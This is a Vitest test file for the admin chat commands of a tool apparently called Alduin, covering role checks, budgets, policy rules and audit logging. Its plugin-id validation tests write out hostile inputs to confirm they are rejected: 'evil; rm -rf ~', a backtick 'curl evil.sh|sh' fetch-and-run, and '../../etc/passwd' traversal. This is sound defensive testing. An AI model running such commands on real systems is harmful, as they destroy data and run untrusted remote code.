import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { handleAdminCommand } from './admin.js';
import type { AdminCommandContext, AdminDeps } from './admin.js';
import { PolicyEngine } from '../../auth/policy.js';
import { AuditLog } from '../../auth/audit.js';
import { BudgetTracker, ScopedBudgetTracker } from '../../tokens/budget.js';
import { TraceLogger } from '../../trace/logger.js';
import Database from 'better-sqlite3';
import { RoleResolver } from '../../auth/roles.js';
import { mkdtempSync, rmSync, readFileSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { SessionStore } from '../../session/store.js';

function makeCtx(role: 'owner' | 'admin' | 'member' | 'guest' = 'owner'): AdminCommandContext {
  return {
    tenant_id: 'acme',
    user_id: 'user-1',
    user_role: role,
    session_id: 'sess-1',
    is_group: false,
  };
}

describe('admin commands', () => {
  let tmpDir: string;
  let deps: AdminDeps;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), 'alduin-admin-'));
    const db = new Database(':memory:');
    const roleResolver = RoleResolver.create(db);
    const policyEngine = new PolicyEngine();
    const auditLog = new AuditLog(join(tmpDir, 'audit.log'), 'test-hmac-key');
    const budgetTracker = new BudgetTracker({
      daily_limit_usd: 10,
      per_task_limit_usd: 2,
      warning_threshold: 0.8,
    });
    const scopedBudget = new ScopedBudgetTracker();
    const traceLogger = new TraceLogger();

    deps = {
      roleResolver,
      policyEngine,
      auditLog,
      budgetTracker,
      scopedBudget,
      traceLogger,
      startedAt: new Date(),
      activeSessionCount: () => 3,
    };
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
  });

  it('ignores non-/alduin messages', () => {
    const result = handleAdminCommand('Hello world', makeCtx(), deps);
    expect(result.handled).toBe(false);
  });

  it('denies member role from running admin commands', () => {
    const result = handleAdminCommand('/alduin status', makeCtx('member'), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('owner or admin');
  });

  it('denies guest role from running admin commands', () => {
    const result = handleAdminCommand('/alduin budget show', makeCtx('guest'), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('owner or admin');
  });

  it('shows help for bare /alduin', () => {
    const result = handleAdminCommand('/alduin', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('Admin commands');
    expect(result.reply).toContain('budget');
    expect(result.reply).toContain('policy');
  });

  it('/alduin status shows uptime and budget', () => {
    const result = handleAdminCommand('/alduin status', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('Alduin');
    expect(result.reply).toContain('Uptime');
    expect(result.reply).toContain('Budget');
    expect(result.reply).toContain('Active sessions: 3');
  });

  it('/alduin budget show displays budget info', () => {
    deps.budgetTracker.trackUsage('t1', 'openai/gpt-4.1', { input_tokens: 0, output_tokens: 0 }, 2.5);
    const result = handleAdminCommand('/alduin budget show', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('$2.50');
  });

  it('/alduin budget set writes to audit log', () => {
    const result = handleAdminCommand('/alduin budget set user:alice 5.00', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('$5.00');

    // Check audit log — H-12 split the legacy single-token entry into
    // action=`budget.set.user` + new_value=`alice=$5.00`, so we check
    // both components rather than the composite `user:alice` string.
    const auditPath = join(tmpDir, 'audit.log');
    expect(existsSync(auditPath)).toBe(true);
    const content = readFileSync(auditPath, 'utf-8');
    expect(content).toContain('budget.set.user');
    expect(content).toContain('alice=$5.00');
    expect(content).toContain('user-1'); // actor
  });

  it('/alduin policy show lists rules', () => {
    const result = handleAdminCommand('/alduin policy show', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('defaults');
  });

  it('/alduin policy allow adds a rule and writes audit', () => {
    const result = handleAdminCommand('/alduin policy allow write', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('allowed');

    const auditPath = join(tmpDir, 'audit.log');
    const content = readFileSync(auditPath, 'utf-8');
    expect(content).toContain('policy.allow');
    expect(content).toContain('write');
  });

  it('/alduin trace shows trace summary', () => {
    deps.traceLogger.startTrace('test-trace', 'Hello');
    deps.traceLogger.completeTrace('test-trace');

    const result = handleAdminCommand('/alduin trace test-trace', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).not.toContain('not found');
  });

  it('/alduin trace uses tree format for recursive traces', () => {
    deps.traceLogger.startTrace('tree-trace', 'Recursive task');

    deps.traceLogger.logEvent('tree-trace', {
      event_type: 'plan_created',
      data: { model: 'sonnet' },
    });
    deps.traceLogger.logEvent('tree-trace', {
      event_type: 'child_orchestration_started',
      data: { child_model: 'qwen', depth: 1 },
    });
    deps.traceLogger.logEvent('tree-trace', {
      event_type: 'executor_completed',
      data: { executor: 'draft', model: 'qwen', cost_usd: 0, latency_ms: 3200 },
    });
    deps.traceLogger.logEvent('tree-trace', {
      event_type: 'child_orchestration_completed',
      data: { child_model: 'qwen', child_cost_usd: 0, cost_usd: 0, latency_ms: 3500 },
    });
    deps.traceLogger.logEvent('tree-trace', {
      event_type: 'synthesis_completed',
      data: { model: 'sonnet', cost_usd: 0.006, latency_ms: 1000 },
    });
    deps.traceLogger.completeTrace('tree-trace');

    const result = handleAdminCommand('/alduin trace tree-trace', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('▸ plan');
    expect(result.reply).toContain('sub-orchestrate → qwen');
    expect(result.reply).toContain('Σ');
  });

  // ── /alduin recursion tests ──────────────────────────────────────────────

  it('/alduin recursion off disables recursion', () => {
    const result = handleAdminCommand('/alduin recursion off', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('disabled');
  });

  it('/alduin recursion on enables recursion', () => {
    const result = handleAdminCommand('/alduin recursion on', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('enabled');
  });

  it('/alduin recursion status reports current state', () => {
    const result = handleAdminCommand('/alduin recursion status', makeCtx(), deps);
    expect(result.handled).toBe(true);
    // Default: ON
    expect(result.reply).toContain('ON');
  });

  it('/alduin recursion shows status by default', () => {
    const result = handleAdminCommand('/alduin recursion', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('ON');
  });

  it('/alduin recursion off writes to audit log', () => {
    handleAdminCommand('/alduin recursion off', makeCtx(), deps);
    const auditPath = join(tmpDir, 'audit.log');
    const content = readFileSync(auditPath, 'utf-8');
    expect(content).toContain('recursion.disable');
  });

  it('/alduin recursion off persists to session when store available', () => {
    const sessionStore = new SessionStore(':memory:');
    sessionStore.create({
      session_id: 'sess-1',
      channel: 'test',
      external_thread_id: 'thread-1',
      external_user_ids: ['user-1'],
      tenant_id: 'acme',
      created_at: new Date().toISOString(),
      last_active_at: new Date().toISOString(),
    });

    deps.sessionStore = sessionStore;

    handleAdminCommand('/alduin recursion off', makeCtx(), deps);

    const session = sessionStore.findById('sess-1');
    expect(session?.policy_overrides?.recursion_disabled).toBe(true);

    sessionStore.close();
  });

  it('/alduin help now includes recursion command', () => {
    const result = handleAdminCommand('/alduin', makeCtx(), deps);
    expect(result.reply).toContain('recursion');
  });

  it('/alduin help includes plugins command', () => {
    const result = handleAdminCommand('/alduin', makeCtx(), deps);
    expect(result.reply).toContain('plugins');
  });

  // ── /alduin budget expanded tests ──────────────────────────────────────

  it('/alduin budget set daily updates daily limit and audits', () => {
    const result = handleAdminCommand('/alduin budget set daily 25.00', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('$25.00');

    const auditPath = join(tmpDir, 'audit.log');
    const content = readFileSync(auditPath, 'utf-8');
    expect(content).toContain('budget.set.daily');
  });

  it('/alduin budget set warn updates threshold and audits', () => {
    const result = handleAdminCommand('/alduin budget set warn 0.9', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('90%');

    const auditPath = join(tmpDir, 'audit.log');
    const content = readFileSync(auditPath, 'utf-8');
    expect(content).toContain('budget.set.warn');
  });

  it('/alduin budget set warn rejects invalid threshold', () => {
    const result = handleAdminCommand('/alduin budget set warn 1.5', makeCtx(), deps);
    expect(result.reply).toContain('Usage');
  });

  // ── H-17: Number.isFinite guard against Infinity/NaN ──────────────────
  it('/alduin budget set daily rejects Infinity (H-17)', () => {
    // Before the fix this passed isNaN but slipped through the <= 0 check,
    // effectively disabling the daily budget.
    const result = handleAdminCommand('/alduin budget set daily Infinity', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('Usage');
  });

  it('/alduin budget set per_model rejects -Infinity (H-17)', () => {
    const result = handleAdminCommand(
      '/alduin budget set per_model openai/gpt-4.1 -Infinity',
      makeCtx(),
      deps
    );
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('Usage');
  });

  it('/alduin budget set warn rejects Infinity (H-17)', () => {
    const result = handleAdminCommand('/alduin budget set warn Infinity', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('Usage');
  });

  it('/alduin budget set per_model sets per-model limit and audits', () => {
    const result = handleAdminCommand('/alduin budget set per_model openai/gpt-4.1 3.50', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('openai/gpt-4.1');
    expect(result.reply).toContain('$3.50');

    const auditPath = join(tmpDir, 'audit.log');
    const content = readFileSync(auditPath, 'utf-8');
    expect(content).toContain('budget.set.per_model');
  });

  // ── /alduin policy expanded tests ──────────────────────────────────────

  it('/alduin policy allow skill adds a skill rule and audits', () => {
    const result = handleAdminCommand('/alduin policy allow skill research', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('research');
    expect(result.reply).toContain('allowed');

    const auditPath = join(tmpDir, 'audit.log');
    const content = readFileSync(auditPath, 'utf-8');
    expect(content).toContain('policy.allow.skill');
    expect(content).toContain('research');
  });

  it('/alduin policy deny connector adds a connector rule and audits', () => {
    const result = handleAdminCommand('/alduin policy deny connector google-calendar', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('google-calendar');
    expect(result.reply).toContain('denied');

    const auditPath = join(tmpDir, 'audit.log');
    const content = readFileSync(auditPath, 'utf-8');
    expect(content).toContain('policy.deny.connector');
  });

  it('/alduin policy allow tool adds a tool rule and audits', () => {
    const result = handleAdminCommand('/alduin policy allow tool echo', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('echo');
    expect(result.reply).toContain('allowed');

    const auditPath = join(tmpDir, 'audit.log');
    const content = readFileSync(auditPath, 'utf-8');
    expect(content).toContain('policy.allow.tool');
  });

  it('/alduin policy deny without target shows usage', () => {
    const result = handleAdminCommand('/alduin policy deny', makeCtx(), deps);
    expect(result.reply).toContain('Usage');
  });

  // ── /alduin models tests ──────────────────────────────────────────────

  it('/alduin models list shows catalog (when catalog available)', () => {
    const mockCatalog = {
      listModels: () => ['anthropic/claude-sonnet-4-6', 'openai/gpt-4.1'],
      isDeprecated: () => false,
    };
    deps.catalog = mockCatalog as any;

    const result = handleAdminCommand('/alduin models list', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('Models (2)');
    expect(result.reply).toContain('anthropic/claude-sonnet-4-6');
  });

  it('/alduin models list says not available without catalog', () => {
    const result = handleAdminCommand('/alduin models list', makeCtx(), deps);
    expect(result.reply).toContain('not available');
  });

  it('/alduin models sync delegates to CLI', () => {
    const result = handleAdminCommand('/alduin models sync', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('terminal');

    const auditPath = join(tmpDir, 'audit.log');
    const content = readFileSync(auditPath, 'utf-8');
    expect(content).toContain('models.sync');
  });

  // ── /alduin plugins tests ─────────────────────────────────────────────

  it('/alduin plugins list shows registered plugins', () => {
    deps.pluginRegistry = {
      listPlugins: () => ['test-plugin'],
      getPluginEntry: () => ({
        manifest: { id: 'test-plugin', kind: 'tool', version: '1.0.0' },
        source: 'builtin',
      }),
    } as any;

    const result = handleAdminCommand('/alduin plugins list', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('Plugins (1)');
    expect(result.reply).toContain('test-plugin');
  });

  it('/alduin plugins list says not available without registry', () => {
    const result = handleAdminCommand('/alduin plugins list', makeCtx(), deps);
    expect(result.reply).toContain('not available');
  });

  it('/alduin plugins install audits and delegates to CLI', () => {
    const result = handleAdminCommand('/alduin plugins install my-tool', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('npm install');

    const auditPath = join(tmpDir, 'audit.log');
    const content = readFileSync(auditPath, 'utf-8');
    expect(content).toContain('plugins.install');
    expect(content).toContain('my-tool');
  });

  it('/alduin plugins remove audits and delegates to CLI', () => {
    const result = handleAdminCommand('/alduin plugins remove old-tool', makeCtx(), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('npm uninstall');

    const auditPath = join(tmpDir, 'audit.log');
    const content = readFileSync(auditPath, 'utf-8');
    expect(content).toContain('plugins.remove');
    expect(content).toContain('old-tool');
  });

  // ── role enforcement for new commands ──────────────────────────────────

  it('member cannot access /alduin plugins', () => {
    const result = handleAdminCommand('/alduin plugins list', makeCtx('member'), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('owner or admin');
  });

  it('guest cannot access /alduin models', () => {
    const result = handleAdminCommand('/alduin models list', makeCtx('guest'), deps);
    expect(result.handled).toBe(true);
    expect(result.reply).toContain('owner or admin');
  });

  // ── H-12: budget scope fall-through ────────────────────────────────────

  describe('/alduin budget set — scope fall-through (H-12)', () => {
    it('rejects an unknown scope with a usage hint instead of silently succeeding', () => {
      const result = handleAdminCommand(
        '/alduin budget set bogus-scope 5.00',
        makeCtx(),
        deps,
      );
      expect(result.handled).toBe(true);
      expect(result.reply).toContain('Unknown budget scope');
      expect(result.reply).toContain('user:<id>');
      expect(result.reply).toContain('group:<id>');

      // Critically: no audit record should have been written for the
      // bogus scope. Either the audit file doesn't exist at all
      // (nothing to write yet) or, if it does, it must not contain the
      // rejected scope.
      const auditPath = join(tmpDir, 'audit.log');
      if (existsSync(auditPath)) {
        const content = readFileSync(auditPath, 'utf-8');
        expect(content).not.toContain('bogus-scope');
      }
    });

    it('rejects an empty scope id after "user:"', () => {
      const result = handleAdminCommand(
        '/alduin budget set user: 5.00',
        makeCtx(),
        deps,
      );
      expect(result.handled).toBe(true);
      expect(result.reply).toMatch(/Scope id is required/i);
    });

    it('rejects an empty scope id after "group:"', () => {
      const result = handleAdminCommand(
        '/alduin budget set group: 5.00',
        makeCtx(),
        deps,
      );
      expect(result.handled).toBe(true);
      expect(result.reply).toMatch(/Scope id is required/i);
    });

    it('reports that scoped budgets are unavailable when deps.scopedBudget is absent', () => {
      const depsWithoutScoped = { ...deps, scopedBudget: undefined };
      const result = handleAdminCommand(
        '/alduin budget set user:alice 5.00',
        makeCtx(),
        depsWithoutScoped,
      );
      expect(result.handled).toBe(true);
      expect(result.reply).toMatch(/scoped budgets are not available/i);
    });
  });

  // ── M-16: plugin id validation ─────────────────────────────────────────

  describe('/alduin plugins install — id validation (M-16)', () => {
    it('rejects shell-injection metacharacters', () => {
      const result = handleAdminCommand(
        '/alduin plugins install evil; rm -rf ~',
        makeCtx(),
        deps,
      );
      expect(result.handled).toBe(true);
      expect(result.reply).toMatch(/Invalid plugin id/i);

      // The unsanitized id must not have reached the audit log.
      // If the rejection fires before any audit write, the file may
      // not exist yet — that's an even stronger guarantee.
      const auditPath = join(tmpDir, 'audit.log');
      if (existsSync(auditPath)) {
        const content = readFileSync(auditPath, 'utf-8');
        expect(content).not.toContain('rm -rf');
      }
    });

    it('rejects backtick subcommand injection', () => {
      const result = handleAdminCommand(
        '/alduin plugins install `curl evil.sh|sh`',
        makeCtx(),
        deps,
      );
      expect(result.reply).toMatch(/Invalid plugin id/i);
    });

    it('rejects path traversal attempts', () => {
      const result = handleAdminCommand(
        '/alduin plugins install ../../etc/passwd',
        makeCtx(),
        deps,
      );
      expect(result.reply).toMatch(/Invalid plugin id/i);
    });

    it('accepts an npm-style scoped plugin id', () => {
      const result = handleAdminCommand(
        '/alduin plugins install @scope/plugin-name',
        makeCtx(),
        deps,
      );
      expect(result.reply).toContain('npm install');
      expect(result.reply).toContain('@scope/plugin-name');
    });

    it('remove command applies the same validation', () => {
      const result = handleAdminCommand(
        '/alduin plugins remove evil; rm -rf ~',
        makeCtx(),
        deps,
      );
      expect(result.reply).toMatch(/Invalid plugin id/i);
    });
  });
});
